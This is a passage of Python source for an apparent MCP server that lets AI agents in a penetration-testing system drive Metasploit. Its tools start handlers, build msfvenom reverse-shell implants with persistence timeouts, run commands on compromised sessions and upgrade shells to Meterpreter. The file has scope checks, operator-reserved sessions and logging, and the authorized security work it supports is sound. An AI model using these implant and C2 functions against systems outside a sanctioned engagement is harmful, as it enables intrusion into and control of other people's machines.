"""Metasploit Framework MCP server for PEN-AGENT.

Wraps the Metasploit RPC API (msfrpcd) via pymetasploit3, exposing handler
management, payload generation, session interaction, generic module execution,
and SOCKS pivoting as MCP tools. Connects to a running msfrpcd daemon using
engagement/msfrpc.yaml (written by run.sh / config.sh).

Metasploit is PEN-AGENT's C2 backend: initial shells are caught by shell-server,
then upgraded to Meterpreter sessions here for stable transport, file transfer,
post-exploitation modules, and pivoting.

Runs as SSE on 127.0.0.1:8024 (configurable via MSF_SSE_PORT).

Scope guardrail: every tool that takes a REMOTE target (run_module RHOSTS,
console `set RHOSTS`) validates it against engagement/scope.allow and refuses
out-of-scope targets. Session-directed tools operate on already-established
access and are not target-gated.
"""

from __future__ import annotations

import functools
import json
import os
import re
import shutil
import subprocess
import threading
import time
from datetime import datetime, timezone
from pathlib import Path

from mcp.server.fastmcp import FastMCP

from scope import ScopeError, check_scope
from validate import (
    ValidationError,
    validate_module_name,
    validate_module_type,
    validate_option_value,
)

_PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent
_SSE_PORT = int(os.environ.get("MSF_SSE_PORT", "8024"))

_NOT_CONFIGURED = (
    "ERROR: Metasploit RPC not configured for this engagement.\n"
    "Start it with ./run.sh (auto-starts msfrpcd + writes engagement/msfrpc.yaml),\n"
    "or run: msfrpcd -P <password> -U msf -a 127.0.0.1 -p 55553\n"
    "then create engagement/msfrpc.yaml with host/port/user/password/ssl."
)
_NOT_CONNECTED = (
    "ERROR: Failed to connect to msfrpcd. Ensure the daemon is running "
    "(pgrep -f msfrpcd) and engagement/msfrpc.yaml is correct."
)

# ── RPC resilience ───────────────────────────────────────────────────────────
# pymetasploit3 does NOT raise on msgrpc auth failures — a call with a stale
# token (e.g. after an msfconsole restart that rebinds on the same port but
# issues fresh tokens) silently returns {"error": True, "error_message":
# "Invalid request parameters"} instead. The naïve probe `client.core.version`
# therefore never raises, we hand back the stale client, and the next real
# tool call fails the same way with no retry. These helpers detect the
# error-dict shape (and token-flavored exception strings for defense in
# depth) so _get_client can invalidate the cache and re-login — and so
# _serialized can retry once at the tool-call layer.
_STALE_AUTH_HINTS = (
    "invalid request parameters",   # msgrpc "unknown/missing token"
    "invalid auth",
    "not authenticated",
    "msfauth",
)


def _is_stale_auth_error(value: object) -> bool:
    """True if `value` looks like a token/auth failure we can fix by re-login.

    Accepts (a) an exception, (b) a pymetasploit3 error-dict response, or
    (c) an error string returned by one of our tool handlers.
    """
    if isinstance(value, BaseException):
        s = str(value).lower()
        return "msfauth" in type(value).__name__.lower() or any(h in s for h in _STALE_AUTH_HINTS)
    if isinstance(value, dict) and value.get("error"):
        s = (str(value.get("error_message", "")) + " " + str(value.get("error_string", ""))).lower()
        return any(h in s for h in _STALE_AUTH_HINTS)
    if isinstance(value, str):
        s = value.lower()
        if not s.startswith("error:") and '"error"' not in s:
            return False
        return any(h in s for h in _STALE_AUTH_HINTS)
    return False


def _install_rpc_timeout(client, connect_s: float = 5.0, read_s: float = 25.0) -> None:
    """Replace the client's post_request with one that enforces a (connect, read)
    socket timeout — pymetasploit3's default has NO timeout, so a wedged
    msgrpc call (the classic orphaned-SOCKS-job scenario) can hang indefinitely
    and, because the metasploit RPC call lock is held, wedge every other agent
    tool call behind it. A bounded read-timeout fails fast so the lock
    releases and the error propagates to the caller.

    Also drops pymetasploit3's embedded @retry(tries=3, backoff=2) wrapper on
    post_request — on a real msgrpc wedge that retry just multiplies the pain;
    tool-level retry (via _serialized) is better placed because it holds the
    lock and knows the context.
    """
    import requests
    headers = client.headers
    def _patched(url, payload):
        return requests.post(url, data=payload, headers=headers,
                             verify=False, timeout=(connect_s, read_s))
    client.post_request = _patched


def _find_config() -> Path | None:
    default = _PROJECT_ROOT / "engagement" / "msfrpc.yaml"
    return default if default.exists() else None


def _parse_config(path: Path) -> dict:
    """Minimal flat `key: value` parser (avoids a YAML dependency)."""
    cfg: dict[str, str] = {}
    for raw in path.read_text().splitlines():
        line = raw.split("#", 1)[0].strip()
        if not line or ":" not in line:
            continue
        key, _, value = line.partition(":")
        cfg[key.strip().lower()] = value.strip().strip('"').strip("'")
    return cfg


def _execute_error(result, expect_job: bool = False) -> str | None:
    """Return an error string if a module.execute() RPC result signals
    failure, else None.

    pymetasploit3's module.execute() returns a dict. On a server-side failure
    (e.g. option validation) msfrpcd does NOT raise — it returns
    {"error": True, "error_message": "..."} instead, which the old code
    ignored while reading a null job_id off it and still reporting success.
    Always surface an explicit error flag. When `expect_job` is set (the
    caller is starting something that always runs as a background job, like a
    handler or the SOCKS proxy), also treat a null `job_id` as failure, since
    that means msfrpcd never actually started the job. `run_module` with
    as_job=False legitimately has no job_id, so it leaves expect_job False.
    """
    if not isinstance(result, dict):
        return f"unexpected RPC result: {result!r}"
    if result.get("error"):
        return str(
            result.get("error_message")
            or result.get("error_string")
            or result
        )
    if expect_job and result.get("job_id") is None:
        return (
            "msfrpcd returned no job_id — the module did not start "
            f"(raw result: {result!r})"
        )
    return None


def _log_session_io(session_id: str, command: str, output: str) -> None:
    """Append one command+output record to the per-session log that the
    operator console reads (engagement/evidence/msf-sessions/<id>.jsonl).

    Best-effort: never breaks a tool call over logging, and skips silently
    when there's no engagement dir.
    """
    try:
        eng = _PROJECT_ROOT / "engagement"
        if not eng.exists():
            return
        d = eng / "evidence" / "msf-sessions"
        d.mkdir(parents=True, exist_ok=True)
        safe = re.sub(r"[^A-Za-z0-9_-]", "_", str(session_id)) or "unknown"
        rec = {
            "ts": datetime.now(tz=timezone.utc).isoformat(timespec="seconds"),
            "command": command,
            "output": output or "",
        }
        with (d / f"{safe}.jsonl").open("a") as f:
            f.write(json.dumps(rec) + "\n")
    except Exception:
        pass


# ── Module-call log (per-call setup record) ──────────────────────────────────
# Every MSF tool that creates a job or runs a module writes one JSONL file to
# engagement/evidence/msf-modules/<call_id>-<slug>.jsonl, capturing exactly how
# the call was set up: tool, module name/type, requested options, raw result,
# and (when the result produced one) the msfrpcd job_id. The operator portal
# reads these so each row in the Listeners/Jobs table and the historical
# "Module Calls" list is clickable → full setup log. Call IDs are a strictly
# monotonic in-process counter; the actual filename is seeded with the current
# time once at startup so IDs across restarts don't collide on disk.
_MODULE_LOG_DIR = _PROJECT_ROOT / "engagement" / "evidence" / "msf-modules"
_HANDLERS_SNAPSHOT = _PROJECT_ROOT / "engagement" / "msf-handlers-snapshot.json"
_module_call_lock = threading.Lock()
_module_call_seq = [int(time.time())]


def _next_call_id() -> int:
    with _module_call_lock:
        _module_call_seq[0] += 1
        return _module_call_seq[0]


def _slugify(s: str, max_len: int = 60) -> str:
    """Short filesystem-safe slug for a module path or label."""
    s = re.sub(r"[^A-Za-z0-9]+", "-", str(s)).strip("-").lower()
    return (s[:max_len] or "call")


def _log_module_call(
    tool: str,
    module: str,
    module_type: str = "",
    options: dict | None = None,
    result: object = None,
    job_id: str | int | None = None,
    extra: dict | None = None,
) -> int | None:
    """Record one MSF tool call to msf-modules/<id>-<slug>.jsonl. Returns the
    call_id, or None if logging was skipped (no engagement dir / write failure).

    Best-effort: never breaks a tool call over logging. The first line of the
    file is a header record (tool, module, options, job_id); subsequent lines
    are reserved for follow-up events (none today, but the format leaves room
    for `kill_job`, `session-opened`, etc. to append later).
    """
    try:
        eng = _PROJECT_ROOT / "engagement"
        if not eng.exists():
            return None
        _MODULE_LOG_DIR.mkdir(parents=True, exist_ok=True)
        call_id = _next_call_id()
        slug = _slugify(module or tool)
        path = _MODULE_LOG_DIR / f"{call_id}-{slug}.jsonl"
        rec = {
            "ts": datetime.now(tz=timezone.utc).isoformat(timespec="seconds"),
            "kind": "call",
            "call_id": call_id,
            "tool": tool,
            "module_type": module_type or "",
            "module": module or "",
            "options": options or {},
            "job_id": str(job_id) if job_id is not None else None,
            "result": result,
        }
        if extra:
            rec["extra"] = extra
        with path.open("a") as f:
            f.write(json.dumps(rec, default=str) + "\n")
        return call_id
    except Exception:
        return None


# ── Operator-reserved sessions ───────────────────────────────────────────────
# Sessions tagged here belong to the human operator (interacted with in the
# tmux msfconsole). Agent-facing session tools refuse to touch them, so the
# operator and the agents never contend for the same session's shell. The
# registry is a small JSON side-file so the operator console can read it too.
_OPERATOR_SESSIONS = _PROJECT_ROOT / "engagement" / "operator-sessions.json"


def _load_reserved() -> dict:
    try:
        if _OPERATOR_SESSIONS.exists():
            data = json.loads(_OPERATOR_SESSIONS.read_text())
            if isinstance(data, dict) and isinstance(data.get("reserved"), dict):
                return data["reserved"]
    except Exception:
        pass
    return {}


def _save_reserved(reserved: dict) -> None:
    try:
        _OPERATOR_SESSIONS.parent.mkdir(parents=True, exist_ok=True)
        _OPERATOR_SESSIONS.write_text(json.dumps({"reserved": reserved}, indent=2))
    except Exception:
        pass


def _is_reserved(session_id) -> bool:
    return str(session_id) in _load_reserved()


def _reserved_guard(session_id) -> str | None:
    """Return a refusal (JSON) if the session is operator-reserved, else None."""
    if _is_reserved(session_id):
        return json.dumps({
            "error": "operator_reserved",
            "session_id": str(session_id),
            "message": (
                f"Session {session_id} is reserved for the human operator and "
                "must not be driven by agents. Pick a different session."
            ),
        })
    return None


def create_server() -> FastMCP:
    mcp = FastMCP(
        "pen-agent-metasploit-server",
        host="127.0.0.1",
        port=_SSE_PORT,
        instructions=(
            "Manages Metasploit C2 for PEN-AGENT. Use start_handler to catch "
            "payload callbacks, generate_payload to build msfvenom payloads, "
            "list_sessions to see active sessions, execute to run commands, "
            "upgrade_to_meterpreter to turn a shell into Meterpreter, run_module "
            "to run any exploit/auxiliary/post module (RHOSTS scope-checked), and "
            "start_socks_proxy is a FALLBACK pivot: it REFUSES to run without "
            "confirm_no_alternative=True + alternative_rejection_reason. Prefer "
            "the pivoting-tunneling skill (chisel / ligolo-ng / sshuttle / SSH "
            "-D) — the in-Framework SOCKS wedges the shared RPC when a session "
            "dies and has repeatedly broken engagements."
        ),
    )

    _state: dict = {"client": None}

    # One shared MsfRpcClient (and the consoles it creates) is reused across
    # every tool call. FastMCP runs these sync tool handlers in a threadpool,
    # so two teammates calling msf tools at once would otherwise hit the same
    # client — and its single underlying requests.Session and console
    # objects — concurrently. pymetasploit3's client / requests.Session are
    # NOT thread-safe (interleaved request/response framing, a shared auth
    # token, shared console IDs), which corrupts the RPC stream and crashes
    # the connection. Serialize every RPC-touching tool behind one reentrant
    # lock: msf operations are effectively serial at msfrpcd anyway, so this
    # trades a little parallelism for not crashing. The lock is NOT held
    # during generate_payload (pure msfvenom subprocess, no shared client) so
    # a long payload build never blocks live RPC.
    _rpc_lock = threading.RLock()

    def _serialized(fn):
        """Serialize a tool handler's shared-client access behind _rpc_lock.
        functools.wraps preserves the signature/annotations FastMCP
        introspects to build the tool schema (inspect.signature follows
        __wrapped__), so the exposed tool is unchanged apart from locking.

        Also implements one-shot stale-auth retry: if the handler returns a
        token-flavored error (dict or string), invalidate the cached client
        so the next _get_client re-logs in, and re-invoke the handler once.
        This makes an msfconsole restart transparent to the MCP — the old
        painful dance (server.py cached the old token → agent errors → manual
        /mcp reconnect) was exactly this missing retry.
        """
        @functools.wraps(fn)
        def _wrapper(*args, **kwargs):
            with _rpc_lock:
                result = fn(*args, **kwargs)
                if _is_stale_auth_error(result):
                    _state["client"] = None
                    result = fn(*args, **kwargs)
                return result
        return _wrapper

    def _get_client():
        """Return a connected MsfRpcClient, or None if unavailable.

        Validates the cached client with a RPC round-trip and inspects the
        RESPONSE (not just exceptions) because pymetasploit3 returns
        {"error": True, ...} on auth failures instead of raising — so a
        naïve try/except around core.version would silently keep a stale
        client after an msfconsole restart. A probe that returns an auth-
        error dict invalidates the cache and triggers a fresh login.
        """
        config_path = _find_config()
        if config_path is None:
            return None
        client = _state.get("client")
        if client is not None:
            try:
                probe = client.core.version
                if _is_stale_auth_error(probe):
                    _state["client"] = None  # fall through to re-login
                else:
                    return client
            except Exception:
                _state["client"] = None
        try:
            from pymetasploit3.msfrpc import MsfRpcClient

            cfg = _parse_config(config_path)
            client = MsfRpcClient(
                cfg.get("password", ""),
                server=cfg.get("host", "127.0.0.1"),
                port=int(cfg.get("port", "55553")),
                username=cfg.get("user", "msf"),
                ssl=str(cfg.get("ssl", "true")).lower() in ("1", "true", "yes"),
            )
            # Enforce a bounded socket timeout on every RPC call so a wedged
            # msgrpc (orphaned SOCKS job, dead relay) can't hang the lock
            # indefinitely. Set BEFORE the probe below so it also protects it.
            _install_rpc_timeout(client)
            probe = client.core.version
            if _is_stale_auth_error(probe):
                _state["client"] = None
                return None
            _state["client"] = client
            return client
        except Exception:
            _state["client"] = None
            return None

    def _require_client():
        """Return (client, None) or (None, error_string)."""
        if _find_config() is None:
            return None, _NOT_CONFIGURED
        client = _get_client()
        if client is None:
            return None, _NOT_CONNECTED
        return client, None

    def _session(client, session_id: str):
        sid = str(session_id)
        if sid not in {str(k) for k in client.sessions.list}:
            return None
        return client.sessions.session(sid)

    # ── Handler / listener management ───────────────────────────────

    @mcp.tool()
    @_serialized
    def start_handler(
        payload: str = "",
        lhost: str = "",
        lport: int = 4444,
        exit_on_session: bool = False,
    ) -> str:
        """Start an exploit/multi/handler to catch a payload callback.

        Args:
            payload: Payload name, e.g. "linux/x64/meterpreter/reverse_tcp"
                     or "windows/x64/meterpreter/reverse_tcp". Required.
            lhost: Callback host (attackbox IP). Required.
            lport: Callback port (must match the payload). Default 4444.
            exit_on_session: Stop the handler after the first session (default
                             false — keep catching).
        """
        if not payload or not lhost:
            return "ERROR: payload and lhost are required."
        try:
            validate_module_name(payload)
            validate_option_value(lhost)
        except ValidationError as e:
            return f"ERROR: {e}"
        client, err = _require_client()
        if err:
            return err
        try:
            handler = client.modules.use("exploit", "multi/handler")
            pay = client.modules.use("payload", payload)
            pay["LHOST"] = lhost
            pay["LPORT"] = int(lport)
            # Work around an observed msfrpcd bug: this payload option's
            # RPC-exposed default comes back non-scalar, so module.execute()
            # fails server-side option validation ("Invalid module option
            # value for AutoLoadExtensions: must be a scalar") WITHOUT
            # raising — it returns an error dict instead. The old code read
            # job_id off that dict (null) and still reported "listening", so
            # no handler ever bound. Set it explicitly to avoid the bad
            # default, and surface the error dict below instead of swallowing
            # it.
            pay["AutoLoadExtensions"] = True
            handler["ExitOnSession"] = bool(exit_on_session)
            result = handler.execute(payload=pay)
            err_msg = _execute_error(result, expect_job=True)
            if err_msg:
                _log_module_call(
                    tool="start_handler",
                    module="exploit/multi/handler",
                    module_type="exploit",
                    options={"PAYLOAD": payload, "LHOST": lhost, "LPORT": int(lport),
                             "ExitOnSession": bool(exit_on_session)},
                    result={"error": err_msg},
                )
                return f"ERROR: Failed to start handler: {err_msg}"
            _log_module_call(
                tool="start_handler",
                module="exploit/multi/handler",
                module_type="exploit",
                options={"PAYLOAD": payload, "LHOST": lhost, "LPORT": int(lport),
                         "ExitOnSession": bool(exit_on_session)},
                result=result,
                job_id=result.get("job_id"),
            )
            return json.dumps(
                {
                    "status": "listening",
                    "job_id": result.get("job_id"),
                    "uuid": result.get("uuid"),
                    "payload": payload,
                    "lhost": lhost,
                    "lport": int(lport),
                }
            )
        except Exception as e:
            return f"ERROR: Failed to start handler: {e}"

    @mcp.tool()
    @_serialized
    def list_jobs() -> str:
        """List active Metasploit jobs (handlers, servers, aux modules)."""
        client, err = _require_client()
        if err:
            return err
        try:
            jobs = client.jobs.list
            result = [{"job_id": jid, "name": name} for jid, name in jobs.items()]
            return json.dumps({"jobs": result, "count": len(result)})
        except Exception as e:
            return f"ERROR: {e}"

    # ── Handler snapshot + restore ──────────────────────────────────
    # Metasploit sessions themselves cannot survive a Framework restart (the
    # sockets live in the dying process), but the HANDLERS that catch them
    # can — and payloads built by generate_payload have retry attributes
    # baked in by default, so if we re-register matching handlers within the
    # SessionCommunicationTimeout window, Meterpreter sessions reconnect
    # automatically. These two tools make that pipeline operator-free.

    def _handler_params_from_log() -> dict[str, dict]:
        """Walk engagement/evidence/msf-modules/*.jsonl and return the most
        recent `start_handler` call keyed by job_id. Each record carries
        exactly PAYLOAD/LHOST/LPORT/ExitOnSession — enough to re-register.
        """
        out: dict[str, dict] = {}
        if not _MODULE_LOG_DIR.exists():
            return out
        # Walk oldest-first so later calls overwrite earlier ones for the
        # same job_id (the current live handler's config wins).
        try:
            files = sorted(
                _MODULE_LOG_DIR.glob("*.jsonl"),
                key=lambda p: int(p.name.split("-", 1)[0]) if p.name.split("-", 1)[0].isdigit() else 0,
            )
        except OSError:
            return out
        for p in files:
            try:
                for line in p.read_text(errors="replace").splitlines():
                    line = line.strip()
                    if not line:
                        continue
                    rec = json.loads(line)
                    if rec.get("tool") != "start_handler":
                        continue
                    jid = rec.get("job_id")
                    if jid is None:
                        continue
                    opts = rec.get("options") or {}
                    payload = opts.get("PAYLOAD")
                    lhost = opts.get("LHOST")
                    lport = opts.get("LPORT")
                    if not (payload and lhost and lport):
                        continue
                    out[str(jid)] = {
                        "payload": str(payload),
                        "lhost": str(lhost),
                        "lport": int(lport),
                        "exit_on_session": bool(opts.get("ExitOnSession", False)),
                        "call_id": rec.get("call_id"),
                    }
            except (OSError, json.JSONDecodeError):
                continue
        return out

    @mcp.tool()
    @_serialized
    def snapshot_handlers() -> str:
        """Snapshot every live exploit/multi/handler to disk for later restore.

        Writes `engagement/msf-handlers-snapshot.json` with one entry per
        live handler job (payload, LHOST, LPORT, exit_on_session). Call this
        BEFORE killing msfconsole — restore_handlers() on the new instance
        re-registers all of them, and Meterpreter payloads built by
        generate_payload (with the default retry attributes) will reconnect
        on their own.

        Reconstructs the config from the module-call log
        (engagement/evidence/msf-modules/) because msfrpcd's list_jobs only
        returns {job_id, name} — the handler's actual payload/LHOST/LPORT
        aren't recoverable from the live Framework state.

        No-op (returns empty snapshot) when nothing's running or no log exists.
        """
        client, err = _require_client()
        if err:
            return err
        try:
            live = {str(jid): name for jid, name in client.jobs.list.items()}
        except Exception as e:
            return f"ERROR: list_jobs failed: {e}"

        handler_jobs = {jid: name for jid, name in live.items()
                        if "multi/handler" in str(name).lower()
                        or "exploit/multi/handler" in str(name).lower()}
        params_by_jid = _handler_params_from_log()
        snapshot = []
        unresolved = []
        for jid, name in handler_jobs.items():
            if jid in params_by_jid:
                p = params_by_jid[jid]
                snapshot.append({"job_id": jid, "name": name, **p})
            else:
                # Handler is live but we have no module-call-log record of its
                # setup (older than the logging feature, or set up via
                # console_exec instead of start_handler). Record it so the
                # operator knows what was lost, but we can't auto-restore it.
                unresolved.append({"job_id": jid, "name": name})

        try:
            _HANDLERS_SNAPSHOT.parent.mkdir(parents=True, exist_ok=True)
            payload = {
                "ts": datetime.now(tz=timezone.utc).isoformat(timespec="seconds"),
                "handlers": snapshot,
                "unresolved": unresolved,
            }
            _HANDLERS_SNAPSHOT.write_text(json.dumps(payload, indent=2))
        except OSError as e:
            return f"ERROR: couldn't write snapshot: {e}"
        return json.dumps({
            "status": "snapshotted",
            "path": str(_HANDLERS_SNAPSHOT),
            "handlers": len(snapshot),
            "unresolved": len(unresolved),
        })

    @mcp.tool()
    @_serialized
    def restore_handlers() -> str:
        """Re-register handlers from the snapshot file onto the current MSF.

        Reads engagement/msf-handlers-snapshot.json (written by
        snapshot_handlers) and starts an exploit/multi/handler for each entry
        via the usual start_handler path. Idempotent: skips any entry whose
        (payload, lhost, lport) is already running as a live handler.

        Payloads built by generate_payload have retry attributes baked in by
        default (SessionCommunicationTimeout=600, SessionExpirationTimeout=
        86400); if the restart cycle completes within those windows, their
        Meterpreter sessions reconnect to the restored handler automatically.
        Raw shells and payloads built with no_retry=True do NOT reconnect —
        those are reported in the result for operator follow-up.
        """
        if not _HANDLERS_SNAPSHOT.exists():
            return json.dumps({
                "status": "no_snapshot",
                "message": f"{_HANDLERS_SNAPSHOT} not found — call snapshot_handlers() before killing msfconsole.",
            })
        try:
            snap = json.loads(_HANDLERS_SNAPSHOT.read_text())
        except (OSError, json.JSONDecodeError) as e:
            return f"ERROR: couldn't read snapshot: {e}"

        client, err = _require_client()
        if err:
            return err

        # Build a (payload, lhost, lport) set of currently-live handlers so we
        # don't double-register. We reconstruct these from the same module-log
        # path snapshot_handlers used — list_jobs itself doesn't expose them.
        try:
            live_jobs = {str(j) for j in client.jobs.list.keys()}
        except Exception as e:
            return f"ERROR: list_jobs failed: {e}"
        live_params = _handler_params_from_log()
        live_keys = {
            (v["payload"], v["lhost"], int(v["lport"]))
            for jid, v in live_params.items() if jid in live_jobs
        }

        restored, skipped, failed = [], [], []
        for h in snap.get("handlers", []):
            key = (h.get("payload"), h.get("lhost"), int(h.get("lport", 0)))
            if key in live_keys:
                skipped.append({**h, "reason": "already_live"})
                continue
            # Re-register via the same module path start_handler uses. Inline
            # here (rather than calling start_handler) because we're already
            # inside _rpc_lock and start_handler would try to grab it again.
            try:
                mod = client.modules.use("exploit", "multi/handler")
                pay = client.modules.use("payload", h["payload"])
                pay["LHOST"] = h["lhost"]
                pay["LPORT"] = int(h["lport"])
                try:
                    if "AutoLoadExtensions" in getattr(pay, "options", []):
                        pay["AutoLoadExtensions"] = True
                except Exception:
                    pass
                mod["ExitOnSession"] = bool(h.get("exit_on_session", False))
                result = mod.execute(payload=pay)
                err_msg = _execute_error(result, expect_job=True)
                if err_msg:
                    failed.append({**h, "error": err_msg})
                else:
                    new_jid = result.get("job_id")
                    restored.append({**h, "new_job_id": new_jid})
                    _log_module_call(
                        tool="restore_handlers",
                        module="exploit/multi/handler",
                        module_type="exploit",
                        options={"PAYLOAD": h["payload"], "LHOST": h["lhost"],
                                 "LPORT": int(h["lport"]),
                                 "ExitOnSession": bool(h.get("exit_on_session", False))},
                        result=result,
                        job_id=new_jid,
                        extra={"restored_from_call_id": h.get("call_id")},
                    )
            except Exception as e:
                failed.append({**h, "error": str(e)})

        return json.dumps({
            "status": "restored",
            "restored": restored,
            "skipped": skipped,
            "failed": failed,
            "unresolved_from_snapshot": snap.get("unresolved", []),
            "hint": (
                "Payloads built by generate_payload (retry defaults) reconnect "
                "within SessionCommunicationTimeout. Raw shells and no_retry "
                "payloads need re-triggering on target."
            ),
        })

    @mcp.tool()
    @_serialized
    def kill_job(job_id: str = "") -> str:
        """Stop a Metasploit job.

        Args:
            job_id: Job ID from list_jobs. Required.
        """
        if job_id == "":
            return "ERROR: job_id is required."
        client, err = _require_client()
        if err:
            return err
        try:
            client.jobs.stop(str(job_id))
            return json.dumps({"status": "killed", "job_id": str(job_id)})
        except Exception as e:
            return f"ERROR: {e}"

    # ── Payload generation (msfvenom) ───────────────────────────────

    @mcp.tool()
    def generate_payload(
        payload: str = "",
        lhost: str = "",
        lport: int = 4444,
        format: str = "elf",
        name: str = "",
        extra_options: str = "",
        no_retry: bool = False,
    ) -> str:
        """Generate a payload with msfvenom, saved to engagement/evidence/.

        By default this bakes in transport-retry attributes so the implant
        survives a brief C2 outage (msfconsole restart, handler re-register):
        `SessionCommunicationTimeout=600` and `SessionExpirationTimeout=86400`.
        If the operator calls restore_handlers() after a restart within the
        communication-timeout window, the Meterpreter session reconnects to
        the new handler on the same LHOST:LPORT — no re-trigger on target.
        The payload binary is a few hundred bytes larger with these set; raw
        shells don't honor them (they have no transport layer).

        Args:
            payload: Payload name, e.g. "windows/x64/meterpreter/reverse_tcp".
                     Required.
            lhost: Callback host (attackbox IP). Required.
            lport: Callback port (must match the handler). Default 4444.
            format: Output format — elf, exe, raw, dll, psh, python, war, etc.
            name: Optional output filename (without path).
            extra_options: Extra "KEY=VALUE KEY=VALUE" msfvenom datastore options
                           (e.g. "EXITFUNC=thread RC4PASSWORD=foo"). Operator-
                           supplied Session*Timeout keys here override the
                           retry defaults — set them to 0 to opt out
                           per-payload, or pass no_retry=True to drop all
                           retry attributes.
            no_retry: Opt out of the baked-in retry attributes for this one
                     payload (minimum-size build; implant will NOT survive a
                     C2 restart).
        """
        if not payload or not lhost:
            return "ERROR: payload and lhost are required."
        msfvenom = shutil.which("msfvenom")
        if not msfvenom:
            return "ERROR: msfvenom not found in PATH (install metasploit-framework)."

        # Bake in the retry defaults unless the operator opted out or supplied
        # the keys themselves. Parse operator extra_options into a dict first so
        # we don't duplicate keys (msfvenom takes the last one but it's noisy).
        extra_opts_tokens = extra_options.split()
        extra_keys_present = {t.split("=", 1)[0].lower() for t in extra_opts_tokens if "=" in t}
        if not no_retry:
            # Meterpreter payloads honor these; raw shells silently ignore.
            # Values picked for "survive a ~minute of restart work without
            # keeping the implant idle so long the box reboots on us."
            if "sessioncommunicationtimeout" not in extra_keys_present:
                extra_opts_tokens.append("SessionCommunicationTimeout=600")
            if "sessionexpirationtimeout" not in extra_keys_present:
                extra_opts_tokens.append("SessionExpirationTimeout=86400")

        try:
            validate_module_name(payload)
            for token in [lhost, str(lport), format, *extra_opts_tokens]:
                validate_option_value(token)
        except ValidationError as e:
            return f"ERROR: {e}"

        evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
        evidence_dir.mkdir(parents=True, exist_ok=True)
        ext = {"exe": ".exe", "dll": ".dll", "elf": "", "war": ".war",
               "psh": ".ps1", "python": ".py", "raw": ".bin"}.get(format, "")
        filename = name or f"payload-{int(time.time())}{ext}"
        filepath = evidence_dir / filename

        cmd = [
            msfvenom, "-p", payload,
            f"LHOST={lhost}", f"LPORT={int(lport)}",
            "-f", format, "-o", str(filepath),
        ]
        for opt in extra_opts_tokens:
            cmd.append(opt)

        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if not filepath.exists():
                return (
                    "ERROR: msfvenom failed.\n"
                    f"stderr: {proc.stderr[-600:] if proc.stderr else ''}"
                )
            size = filepath.stat().st_size
            try:
                filepath.chmod(0o755)
            except OSError:
                pass
            _log_module_call(
                tool="generate_payload", module=payload, module_type="payload",
                options={"LHOST": lhost, "LPORT": int(lport), "format": format,
                         "name": filename, "extra_options": extra_options},
                result={"status": "generated", "path": str(filepath), "size": size,
                        "stderr_tail": (proc.stderr or "")[-400:]},
            )
            return json.dumps(
                {
                    "status": "generated",
                    "name": filename,
                    "path": str(filepath),
                    "size": size,
                    "payload": payload,
                    "callback": f"{lhost}:{int(lport)}",
                }
            )
        except subprocess.TimeoutExpired:
            return "ERROR: msfvenom timed out after 300s."
        except Exception as e:
            return f"ERROR: Payload generation failed: {e}"

    # ── Session management ──────────────────────────────────────────

    @mcp.tool()
    @_serialized
    def list_sessions() -> str:
        """List all active Metasploit sessions with metadata."""
        client, err = _require_client()
        if err:
            return err
        try:
            sessions = client.sessions.list
            reserved = _load_reserved()
            result = []
            for sid, meta in sessions.items():
                result.append(
                    {
                        "session_id": str(sid),
                        "type": meta.get("type"),
                        "tunnel_peer": meta.get("tunnel_peer"),
                        "via_exploit": meta.get("via_exploit"),
                        "platform": meta.get("platform"),
                        "arch": meta.get("arch"),
                        "username": meta.get("username"),
                        "info": meta.get("info"),
                        "alive": True,
                        # True → reserved for the human operator; agents must not
                        # drive it (execute/upload/kill/… refuse it).
                        "operator_reserved": str(sid) in reserved,
                    }
                )
            return json.dumps({"sessions": result, "count": len(result)})
        except Exception as e:
            return f"ERROR: {e}"

    @mcp.tool()
    @_serialized
    def execute(session_id: str = "", command: str = "", timeout: int = 30) -> str:
        """Run a command on an existing session (shell or Meterpreter).

        Operates on already-established access — not target-gated.

        Args:
            session_id: Session ID from list_sessions. Required.
            command: Command to run. For shell sessions this is a shell command
                     ("id && uname -a"); for Meterpreter it is a Meterpreter
                     console command ("sysinfo", "getuid", "ls"). Required.
            timeout: Seconds to wait for output. Default 30.
        """
        if not session_id or not command:
            return "ERROR: session_id and command are required."
        guard = _reserved_guard(session_id)
        if guard:
            return guard
        client, err = _require_client()
        if err:
            return err
        try:
            session = _session(client, session_id)
            if session is None:
                return f"ERROR: Session {session_id} not found or dead."
            output = session.run_with_output(command, timeout=timeout)
            _log_session_io(session_id, command, output)
            return json.dumps(
                {"status": "executed", "session_id": str(session_id), "output": output}
            )
        except TypeError:
            # Older pymetasploit3 shell sessions: write/read fallback.
            try:
                session.write(command)
                time.sleep(2)
                output = session.read()
                _log_session_io(session_id, command, output)
                return json.dumps(
                    {"status": "executed", "session_id": str(session_id),
                     "output": output}
                )
            except Exception as e:
                return f"ERROR: Command execution failed: {e}"
        except Exception as e:
            return f"ERROR: Command execution failed: {e}"

    @mcp.tool()
    @_serialized
    def upgrade_to_meterpreter(session_id: str = "", lhost: str = "", lport: int = 4433) -> str:
        """Upgrade a raw shell session to Meterpreter.

        Runs post/multi/manage/shell_to_meterpreter against the shell session.

        Args:
            session_id: Shell session ID to upgrade. Required.
            lhost: Callback host for the Meterpreter stager. Required.
            lport: Callback port for the upgrade (default 4433).
        """
        if not session_id or not lhost:
            return "ERROR: session_id and lhost are required."
        guard = _reserved_guard(session_id)
        if guard:
            return guard
        try:
            validate_option_value(lhost)
        except ValidationError as e:
            return f"ERROR: {e}"
        client, err = _require_client()
        if err:
            return err
        try:
            mod = client.modules.use("post", "multi/manage/shell_to_meterpreter")
            mod["SESSION"] = int(session_id)
            mod["LHOST"] = lhost
            mod["LPORT"] = int(lport)
            result = mod.execute()
            # shell_to_meterpreter spins up its own handler job — a null
            # job_id / error dict means the upgrade never actually launched.
            err_msg = _execute_error(result, expect_job=True)
            _log_module_call(
                tool="upgrade_to_meterpreter",
                module="post/multi/manage/shell_to_meterpreter",
                module_type="post",
                options={"SESSION": int(session_id), "LHOST": lhost, "LPORT": int(lport)},
                result={"error": err_msg} if err_msg else result,
                job_id=result.get("job_id") if isinstance(result, dict) and not err_msg else None,
            )
            if err_msg:
                return f"ERROR: Upgrade failed: {err_msg}"
            return json.dumps(
                {
                    "status": "upgrade_started",
                    "session_id": str(session_id),
                    "job_id": result.get("job_id"),
                    "hint": "Poll list_sessions for the new Meterpreter session.",
                }
            )
        except Exception as e:
            return f"ERROR: Upgrade failed: {e}"

    @mcp.tool()
    @_serialized
